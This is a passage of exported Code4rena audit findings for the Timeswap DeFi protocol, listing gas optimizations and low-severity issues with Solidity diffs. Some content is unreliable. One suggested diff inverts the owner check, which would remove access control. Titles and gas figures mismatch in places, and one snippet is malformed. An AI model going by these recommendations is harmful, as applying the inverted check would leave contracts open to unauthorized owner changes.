      "content": "\nAn if block check can be added as follows. With this control, gas saving is achieved by avoiding the use of external calls.\n\n```diff\npackages/v2-pool/src/base/OwnableTwoSteps.sol:\n  22      /// @inheritdoc IOwnableTwoSteps\n  23:     function setPendingOwner(address chosenPendingOwner) external override {\n- 24:         Ownership.checkIfOwner(owner);\n+ 24:         if (msg.sender == owner) revert NotOwner();\n  25: \n  26:         if (chosenPendingOwner == address(0)) Error.zeroAddress();\n  27:         chosenPendingOwner.checkIfAlreadyOwner(owner);\n  28: \n  29:         pendingOwner = chosenPendingOwner;\n  30: \n  31:         emit SetOwner(pendingOwner);\n  32:     }\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L24\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24927",
      "title": "[G-08] In ``div 512`` function, ``quotient 0`` aggregate operation is used with unchecked to save gas",
      "impact": "GAS",
      "content": "\n```diff\npackages/v2-library/src/FullMath.sol:\n  158:     function div512(uint256 dividend0, uint256 dividend1, uint256 divisor, bool roundUp) internal pure returns (uint256 quotient0, uint256 quotient1) {\n  159:         (quotient0, quotient1) = div512(dividend0, dividend1, divisor);\n  160: \n  161:         if (roundUp) {\n  162:             (uint256 productA0, uint256 productA1) = mul512(quotient0, divisor);\n  163:             productA1 += (quotient1 * divisor);\n  164:             if (dividend1 > productA1 || dividend0 > productA0) {\n  165:                 if (quotient0 == type(uint256).max) {\n  166:                     quotient0 = 0;\n  167:                     quotient1++;\n- 168:                 } else quotient0++;\n+ 168:                 } else \n+                         unchecked {\n+                          quotient0++;\n+                         } \n  169:             }\n  170:         }\n  171:     }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/FullMath.sol#L165-L168\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24926",
      "title": "[G-07] Using ``delete``  instead of setting struct ``0`` saves gas",
      "impact": "GAS",
      "content": "\n10 results - 2 files:\n\n```solidity\npackages\\v2-pool\\src\\structs\\LiquidityPosition.sol:\n   93:    liquidityPosition.long0Fees = 0;\n\n  101:    liquidityPosition.long1Fees = 0;\n\n  109:    liquidityPosition.shortFees = 0;\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/LiquidityPosition.sol#L93\n\n\n```solidity\npackages\\v2-pool\\src\\structs\\Pool.sol:\n  228:    pool.long0ProtocolFees = 0;\n\n  236:    pool.long1ProtocolFees = 0;\n\n  244:    pool.shortProtocolFees = 0;\n\n  633:    pool.long0Balance = 0;\n\n  646:    pool.long1Balance = 0;\n\n  685:    pool.long1Balance = 0;\n\n  706:    pool.long0Balance = 0;\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Pool.sol#L228\n\n\n**Recommendation code:**\n\n```diff\npackages\\v2-pool\\src\\structs\\Pool.sol#L228\n-  228:    pool.long0ProtocolFees = 0;\n+ 228:    delete pool.long0ProtocolFees;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24925",
      "title": "[G-06] Gas savings can be achieved by changing the model for assigning value to the structure (260 gas)",
      "impact": "GAS",
      "content": "\nBy changing the pattern of assigning value to the structure, gas savings of ``~130`` per instance are achieved. In addition, this use will provide significant savings in distribution costs.\n\nThere are two examples of this issue:\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2PoolDeployer.sol:\n  25:     function distribution(pool Factory address, option pair address, uint256 transaction Fee, uint256 protocol Fee) internal returns (poolPair address) {\n  26:         parameter = Parameter({poolFactory: poolFactory, optionPair: optionPair, transactionFees: transactionFees, protocolFees: protocolFees});\n```\n\n\n```solidity\npackages\\v2-option\\src\\TimeswapV2OptionDeployer.sol:\n  32:     function deploy(address optionFactory, address identifier0, address identifier1) internal returns (address optionPair) {\n  33:         parameter = Parameter({optionFactory:optionFactory, symbol0: symbol0, symbol1: symbol1});\n```\n\nThe following model, which is more gas efficient, can be preferred to assign value to the building elements.\n\n```diff\npackages\\v2-option\\src\\TimeswapV2OptionDeployer.sol:\n  32:     function deploy(address optionFactory, address identifier0, address identifier1) internal returns (address optionPair) {\n- 33:         parameter = Parameter({optionFactory: optionsFactory, token0: token0, token1: token1});\n+              parameter.optionFactory = optionFactory;\n+              parameter.token0 = token0;\n+              parameter.token1 = token1;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24924",
      "title": "[G-05] Save gas with the use of the import statement",
      "impact": "GAS",
      "content": "\nWhile the following two critical fee values are assigned in the constructor, there is no zero value control. This means that if both state variables are started with a possible value of ``0``, the contract must be deployed again. This possibility means gas consumption.\n\nZero value control is the most error-prone value control since zero value is assigned in case of no value entry due to EVM design.\n\nIn addition, since the immutable value will be changed once, adding a zero value control does not cause high gas consumption.\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2PoolFactory.sol:\n  37:     constructor(address chosenOwner, uint256 chosenTransactionFee, uint256 chosenProtocolFee) OwnableTwoSteps(chosenOwner) {\n  38:         if (chosenTransactionFee > type(uint16).max) revert IncorrectFeeInitialization(chosenTransactionFee);\n  39:         if (chosenProtocolFee > type(uint16).max) revert IncorrectFeeInitialization(chosenProtocolFee);\n  40: \n  41:         transactionFee = chosenTransactionFee;\n  42:         protocolFee = chosenProtocolFee;\n  43:     }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2PoolFactory.sol#L37-L43\n\n\n**Recommendation:**\n\nIt is recommended to perform a zero value check for critical value assignments.\n\nAdd zero check for immutable values when assigning values in critical constructor.\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24923",
      "title": "[G-04] Change ``public`` state variable visibility to ``private``",
      "impact": "GAS",
      "content": "\nIf it is preferred to change the visibility of the `owner` and `pendingOwnerstate` state variables to ``private``, this will save significant gas.\n\n2 result - 1 file:\n\n```solidity\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n  14:     address public override owner;\n\n  16:     address public override pendingOwner;\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L14-L16\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24922",
      "title": "[G-03] Avoid using ``state variable`` in emit (130 gas)",
      "impact": "GAS",
      "content": "\nUsing a state variable in ``SetOwner`` emits wastes gas.\n\n1 result - 1 file:\n```solidity\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n  23     function setPendingOwner(address chosenPendingOwner) external override {\n  24         Ownership.checkIfOwner(owner);\n  25 \n  26:        if (chosenPendingOwner == address(0)) Error.zeroAddress();\n  27         chosenPendingOwner.checkIfAlreadyOwner(owner);\n  28 \n  29         pendingOwner = chosenPendingOwner;\n  30 \n  31:         emit SetOwner(pendingOwner);\n  32:     }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/base/OwnableTwoSteps.sol#L31\n\nIf the following recommendation is taken into account, 130 gas is saved.\n\n```diff\npackages\\v2-pool\\src\\base\\OwnableTwoSteps.sol:\n 23     function setPendingOwner(address chosenPendingOwner) external override {\n  24         Ownership.checkIfOwner(owner);\n  25 \n  26         if (chosenPendingOwner == address(0)) Error.zeroAddress();\n  27         chosenPendingOwner.checkIfAlreadyOwner(owner);\n  28 \n+ 31:         emit SetOwner(chosenPendingOwner);\n  29         pendingOwner = chosenPendingOwner;\n  30 \n- 31:         emit SetOwner(pendingOwner);\n  32     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24921",
      "title": "[G-02] Remove ``checkDoesNotExist`` function",
      "impact": "GAS",
      "content": "\nUsing separate internal functions for non-repeating if blocks in more than one function wastes gas.\n\nThe `checkDoesNotExist` _internal_ function in the `OptionPair.sol` contract is only used in the ``create`` function of the `TimeswapV2OptionFactory.sol` contract.\n\n```solidity \npackages\\v2-option\\src\\TimeswapV2OptionFactory.sol:\n  43:     function create(address token0, address token1) external override returns (address optionPair) {\n  44:         if (token0 == address(0)) Error.zeroAddress();\n  45:         if (token1 == address(0)) Error.zeroAddress();\n  46:         OptionPairLibrary.checkCorrectFormat(token0, token1);\n  47: \n  48:         optionPair = optionPairs[token0][token1];\n  49:         OptionPairLibrary.checkDoesNotExist(token0, token1, optionPair);\n  50: \n  51:         optionPair = deploy(address(this), token0, token1);\n  52: \n  53:         optionPairs[token0][token1] = optionPair;\n  54: \n  55:         emit Create(msg.sender, token0, token1, optionPair);\n  56:     }\n  57  }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2OptionFactory.sol#L43-L57\n\n**Recommendation:**\n\nI suggest that the check on line 50 be done by adding the **if** block as follows.\n\n**_packages\\v2-option\\src\\TimeswapV2OptionFactory.sol_**\n```diff\n  43:     function create(address token0, address token1) external override returns (address optionPair) {\n  44:         if (token0 == address(0)) Error.zeroAddress();\n  45:         if (token1 == address(0)) Error.zeroAddress();\n  46:         OptionPairLibrary.checkCorrectFormat(token0, token1);\n  47: \n  48:         optionPair = optionPairs[token0][token1];\n- 49:         OptionPairLibrary.checkDoesNotExist(token0, token1, optionPair);\n+                   if (optionPair != address(0)) revert OptionPairAlreadyExisted(token0, token1, optionPair);\n  50: \n  51:         optionPair = deploy(address(this), token0, token1);\n  52: \n  53:         optionPairs[token0][token1] = optionPair;\n  54: \n  55:         emit Create(msg.sender, token0, token1, optionPair);\n  56:     }\n  57  }\n```\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2OptionFactory.sol#L43-L57\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24920",
      "title": "[G-01] Gas saving is achieved by removing the ``delete`` keyword (~60k)",
      "impact": "GAS",
      "content": "\n30k gas savings were made by removing the ``delete`` keyword. The reason for using the ``delete`` keyword here is to reset the struct values (set to default value) in every operation. However, the struct values do not need to be zero each time the function is run. Therefore, the ``delete'' key word is unnecessary. If it is removed, around 30k gas savings will be achieved.\n\n\nThere are two instances of the subject:\n\n```diff\npackages\\v2-option\\src\\TimeswapV2OptionDeployer.sol:\n  31      /// @return optionPair The address of the newly deployed TimeswapV2Option contract.\n  32:     function deploy(address optionFactory, address token0, address token1) internal returns (address optionPair) {\n  33:         parameter = Parameter({optionFactory: optionFactory, token0: token0, token1: token1});\n  34: \n  35:         optionPair = address(new TimeswapV2Option{salt: keccak256(abi.encode(token0, token1))}());\n  36: \n  37:         // save gas.\n- 38:         delete parameter;\n  39:     }\n  40  }\n```\n\n```diff\npackages\\v2-pool\\src\\TimeswapV2PoolDeployer.sol:\n  24  \n  25:     function deploy(address poolFactory, address optionPair, uint256 transactionFee, uint256 protocolFee) internal returns (address poolPair) {\n  26:         parameter = Parameter({poolFactory: poolFactory, optionPair: optionPair, transactionFee: transactionFee, protocolFee: protocolFee});\n  27: \n  28:         poolPair = address(new TimeswapV2Pool{salt: keccak256(abi.encode(optionPair))}());\n  29: \n- 30:         delete parameter;\n  31:     }\n  32  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24919",
      "title": "[09] Missing NatSpec comments",
      "impact": "LOW",
      "content": "\nNatSpec comments provide rich code documentation. The following functions are some examples that miss NatSpec comments. Please consider adding NatSpec comments for functions like these.\n\n```solidity\nv2-option\\src\\TimeswapV2Option.sol\n  56: function addOptionEnumerationIfNecessary(uint256 strike, uint256 maturity) private {    \n  70: function blockTimestamp() internal view virtual returns (uint96) {  \n\nv2-pool\\src\\TimeswapV2Pool.sol\n  57: function addPoolEnumerationIfNecessary(uint256 strike, uint256 maturity) private { \n  66: function raiseGuard(uint256 strike, uint256 maturity) private { \n  71: function lowerGuard(uint256 strike, uint256 maturity) private { \n  82: function blockTimestamp(uint96 durationForward) internal view virtual returns (uint96) {    \n  252: function mint(  \n\nv2-pool\\src\\TimeswapV2PoolDeployer.sol\n  25: function deploy(address poolFactory, address optionPair, uint256 transactionFee, uint256 protocolFee) internal returns (address poolPair) { \n\nv2-pool\\src\\structs\\LiquidityPosition.sol\n  85: function collectTransactionFees(    \n```\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24918",
      "title": "[08] Incomplete NatSpec Comments",
      "impact": "LOW",
      "content": "\nNatSpec comments provide rich code documentation. The following functions are some examples that miss the `@param` and/or `@return` comments.\n\n Please consider completing the NatSpec comments for functions like these.\n\n```solidity\nv2-library\\src\\Error.sol\n  125: function inactiveOptionChoice(uint256 strike, uint256 maturity) internal pure { \n\nv2-library\\src\\StrikeConversion.sol\n  16: function convert(uint256 amount, uint256 strike, bool zeroToOne, bool roundUp) internal pure returns (uint256) {    \n  26: function turn(uint256 amount, uint256 strike, bool toOne, bool roundUp) internal pure returns (uint256) {    \n  35: function combine(uint256 amount0, uint256 amount1, uint256 strike, bool roundUp) internal pure returns (uint256) {  \n\nv2-option\\src\\interfaces\\ITimeswapV2Option.sol\n  169: function burn(TimeswapV2OptionBurnParam calldata param) external returns (uint256 token0AndLong0Amount, uint256 token1AndLong1Amount, uint256 shortAmount, bytes memory data);  \n  190: function collect(TimeswapV2OptionCollectParam calldata param) external returns (uint256 token0Amount, uint256 token1Amount, uint256 shortAmount, bytes memory data);  \n\nv2-option\\src\\interfaces\\ITimeswapV2OptionFactory.sol\n  28: function getByIndex(uint256 id) external view returns (address optionPair); \n\nv2-pool\\src\\interfaces\\callbacks\\ITimeswapV2PoolBurnCallback.sol\n  13: function timeswapV2PoolBurnChoiceCallback(TimeswapV2PoolBurnChoiceCallbackParam calldata param) external returns (uint256 long0Amount, uint256 long1Amount, bytes memory data); \n\nv2-pool\\src\\interfaces\\callbacks\\ITimeswapV2PoolMintCallback.sol\n  14: function timeswapV2PoolMintChoiceCallback(TimeswapV2PoolMintChoiceCallbackParam calldata param) external returns (uint256 long0Amount, uint256 long1Amount, bytes memory data); \n  18: function timeswapV2PoolMintCallback(TimeswapV2PoolMintCallbackParam calldata param) external returns (bytes memory data); \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24917",
      "title": "[07] Confusing NatSpec `@param` usage",
      "impact": "LOW",
      "content": "\nBecause `data` is the returned variable of the following functions, `@return` can be used instead of `@param` in the corresponding NatSpec comment to avoid confusion.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/interfaces/callbacks/ITimeswapV2PoolMintCallback.sol#L13-L14\n\n```solidity\n    /// @param data The bytes of data to be sent to msg.sender.\n    function timeswapV2PoolMintChoiceCallback(TimeswapV2PoolMintChoiceCallbackParam calldata param) external returns (uint256 long0Amount, uint256 long1Amount, bytes memory data);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/interfaces/callbacks/ITimeswapV2PoolMintCallback.sol#L17-L18\n\n```solidity\n    /// @param data The bytes of data to be sent to msg.sender.\n    function timeswapV2PoolMintCallback(TimeswapV2PoolMintCallbackParam calldata param) external returns (bytes memory data);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24916",
      "title": "[06] Word/typing typos",
      "impact": "LOW",
      "content": "`ot` can be changed to `to` in the following comment.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/StrikeConversion.sol#L22\n\n```solidity\n    /// @param amount The amount ot be converted. Token0 amount when zeroToOne. Token1 amount when oneToZero.\n```\n\n`overidden` can be changed to `overridden` in the following comment.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L69\n\n```solidity\n    // Can be overidden for testing purposes.\n```\n\n`positionss` can be changed to `positions` in the following comment.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/interfaces/callbacks/ITimeswapV2PoolMintCallback.sol#L10\n\n```solidity\n    /// @dev The liquidity positionss will already be minted to the receipient.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24915",
      "title": "[05] Redundant named returns",
      "impact": "LOW",
      "content": "\nWhen a function has unused named returns and used return statements, these named returns become redundant. To improve readability and maintainability, these variables for the named returns can be removed while keeping the return statements for the functions associated with the following lines.\n\n```solidity\nv2-pool\\src\\TimeswapV2Pool.sol\n  240: function mint(TimeswapV2PoolMintParam calldata param) external override returns (uint160 liquidityAmount, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount, bytes memory data) {\n  248: ) external override returns (uint160 liquidityAmount, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount, bytes memory data) {\n  305: function burn(TimeswapV2PoolBurnParam calldata param) external override returns (uint160 liquidityAmount, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount, bytes memory data) {\n  313: ) external override returns (uint160 liquidityAmount, uint256 long0Amount, uint256 long1Amount, uint256 shortAmount, bytes memory data) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24914",
      "title": "[04] Pool's `ParamLibrary.check` function for `TimeswapV2PoolCollectParam` checks `param.strike == 0` less restrictively than pool's other  `ParamLibrary.check` functions",
      "impact": "LOW",
      "content": "\nAs shown below, calling the pool's `ParamLibrary.check` function for `TimeswapV2PoolCollectParam` will not revert when `param.strike` is 0 while one or more of `param.long0Requested`, `param.long1Requested`, or `param.shortRequested` is not 0. However, calling the pool's other `ParamLibrary.check` functions for other `param` will revert whenever `param.strike == 0` is true. To handle the `param.strike == 0` check consistently, please consider updating the `&& param.strike == 0` condition to `|| param.strike == 0` in the pool's `ParamLibrary.check` function for `TimeswapV2PoolCollectParam`.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Param.sol#L133-L194\n\n```solidity\n    function check(TimeswapV2PoolCollectParam memory param) internal pure {\n        ...\n        if (param.long0Requested == 0 && param.long1Requested == 0 && param.shortRequested == 0 && param.strike == 0) Error.zeroInput();\n    }\n\n    ...\n    function check(TimeswapV2PoolMintParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.delta == 0 || param.strike == 0) Error.zeroInput();\n    }\n\n    ...\n    function check(TimeswapV2PoolBurnParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.delta == 0 || param.strike == 0) Error.zeroInput();\n    }\n\n    ...\n    function check(TimeswapV2PoolDeleverageParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.delta == 0 || param.strike == 0) Error.zeroInput();\n    }\n\n    ...\n    function check(TimeswapV2PoolLeverageParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.delta == 0 || param.strike == 0) Error.zeroInput();\n    }\n\n    ...\n    function check(TimeswapV2PoolRebalanceParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.delta == 0 || param.strike == 0) Error.zeroInput();\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24913",
      "title": "[03] Pool considers option not matured when its maturity and the block timestamp are equal",
      "impact": "LOW",
      "content": "\nAs shown by the following comparisons between the option's maturity and the block timestamp in the following `TimeswapV2Pool.initialize` function and the pool's various `ParamLibrary.check` functions, the pool considers the corresponding option not matured when its maturity and the block timestamp are equal. However, this is inconsistent with the option's definition, which considers the option matured when its maturity and the block timestamp are equal as the option's various `ParamLibrary.check` functions below show. The `TimeswapV2Pool` contract's `mint`, `burn`, `deleverage`, `leverage`, and `rebalance` functions all have the `can be only called before the maturity` comment indicating that these functions are supposed to be callable only when the corresponding option is not matured. Users who checked these comments can believe that these functions are callable when the option's maturity and the block timestamp are equal; yet, calling these functions at such timing will revert due to the duration to the option's maturity is already 0 and the inconsistency between the pool and option's definitions of whether the option is matured. As a result, in this case, the user's calls of these `TimeswapV2Pool` contract's functions will revert unexpectedly with the used gas being wasted, and the user experience becoming degraded.\n\nAs a mitigation, the pool and option's definitions of whether the option is matured need to be updated to be consistent.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/TimeswapV2Pool.sol#L175-L181\n\n```solidity\n    function initialize(uint256 strike, uint256 maturity, uint160 rate) external override noDelegateCall {\n        if (maturity < blockTimestamp(0)) Error.alreadyMatured(maturity, blockTimestamp(0));\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-pool/src/structs/Param.sol#L142-L194\n\n```solidity\n    ...\n    function check(TimeswapV2PoolMintParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity < blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2PoolBurnParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity < blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2PoolDeleverageParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity < blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2PoolLeverageParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity < blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2PoolRebalanceParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity < blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/structs/Param.sol#L103-L151\n\n```solidity\n    function check(TimeswapV2OptionMintParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity <= blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2OptionBurnParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity <= blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2OptionSwapParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity <= blockTimestamp) Error.alreadyMatured(param.maturity, blockTimestamp);\n        ...\n    }\n\n    ...\n    function check(TimeswapV2OptionCollectParam memory param, uint96 blockTimestamp) internal pure {\n        ...\n        if (param.maturity > blockTimestamp) Error.stillActive(param.maturity, blockTimestamp);\n        ...\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24912",
      "title": "[02] `Error.checkEnough` function does not prevent user from sending too many tokens to relevant contract",
      "impact": "LOW",
      "content": "\nWhen calling functions like `TimeswapV2Option.mint` or `TimeswapV2Option.swap`, the user will use the callback function like `ITimeswapV2OptionMintCallback.timeswapV2OptionMintCallback` or `ITimeswapV2OptionSwapCallback.timeswapV2OptionSwapCallback` to send some of the corresponding tokens to the relevant contract, such as `TimeswapV2Option`. Calling functions like `TimeswapV2Option.mint` or `TimeswapV2Option.swap` will revert if its call to the following `Error.checkEnough` function reverts when the token amount transferred through the callback function is not enough. However, if user sends too many tokens through the callback function, the `Error.checkEnough` function does not revert; when this happens, the extra token amount after the corresponding token balance target is met will be locked in the relevant receiving contract like `TimeswapV2Option` so the user loses such extra amount.\n\nAs a mitigation, the `balance < balanceTarget` condition in the `Error.checkEnough` function can be updated to `balance != balanceTarget`. Alternatively, some logic can be added for returning the sent extra token amount back to the user.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-library/src/Error.sol#L151-L153\n\n```solidity\n    function checkEnough(uint256 balance, uint256 balanceTarget) internal pure {\n        if (balance < balanceTarget) revert NotEnoughReceived(balance, balanceTarget);\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24911",
      "title": "[01] User can possibly transfer no `token0` or `token1` to `TimeswapV2Option` contract if corresponding `token0` OR `token1` is a rebasing token",
      "impact": "LOW",
      "content": "\nWhen calling the following `TimeswapV2Option.mint` function, `msg.sender` uses the `ITimeswapV2OptionMintCallback.timeswapV2OptionMintCallback` function to transfer the relevant `token0` and/or `token1` to the `TimeswapV2Option` contract. Similarly, when calling the `TimeswapV2Option.swap` function below, `msg.sender` uses the `ITimeswapV2OptionSwapCallback.timeswapV2OptionSwapCallback` function to transfer the relevant `token0` or `token1` to the `TimeswapV2Option` contract. When `token0` or `token1` is a rebasing token, it is possible that the user uses these callback functions to trigger such token's rebasing event that increases its balance owned by the `TimeswapV2Option` contract.\n\nThen, when the `TimeswapV2Option.mint` and `TimeswapV2Option.swap` functions call `Error.checkEnough`, the rebasing token's balance owned by the `TimeswapV2Option` contract can possibly exceed the corresponding balance target. As a result, the user is able to mint or swap option positions without sending any of such rebasing token to the `TimeswapV2Option` contract.\n\nAs a mitigation, this protocol can behave like other protocols that do not support rebasing tokens and use a blocklist to block such tokens from being used as `token0` or `token1` for any options.\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-option/src/TimeswapV2Option.sol#L109-L154\n\n```solidity\n    function mint(\n        TimeswapV2OptionMintParam calldata param\n    ) external override noDelegateCall returns (uint256 token0AndLong0Amount, uint256 token1AndLong1Amount, uint256 shortAmount, bytes memory data) {\n        ...\n\n        Option storage option = options[param.strike][param.maturity];\n\n        // does main mint logic calculation\n        (token0AndLong0Amount, token1AndLong1Amount, shortAmount) = option.mint(param.strike, param.long0To, param.long1To, param.shortTo, param.transaction, param.amount0, param.amount1);\n\n        // update token0 and token1 balance target for any previous concurrent option transactions.\n        processing.updateProcess(token0AndLong0Amount, token1AndLong1Amount, true, true);\n\n        // add a new process\n        // stores the token0 and token1 balance target required from the msg.sender to achieve.\n        Process storage currentProcess = (processing.push() = Process(\n            param.strike,\n            param.maturity,\n            IERC20(token0).balanceOf(address(this)) + token0AndLong0Amount,\n            IERC20(token1).balanceOf(address(this)) + token1AndLong1Amount\n        ));\n\n        // ask the msg.sender to transfer token0 and/or token1 to this contract.\n        data = ITimeswapV2OptionMintCallback(msg.sender).timeswapV2OptionMintCallback(\n            TimeswapV2OptionMintCallbackParam({\n                strike: param.strike,\n                maturity: param.maturity,\n                token0AndLong0Amount: token0AndLong0Amount,\n                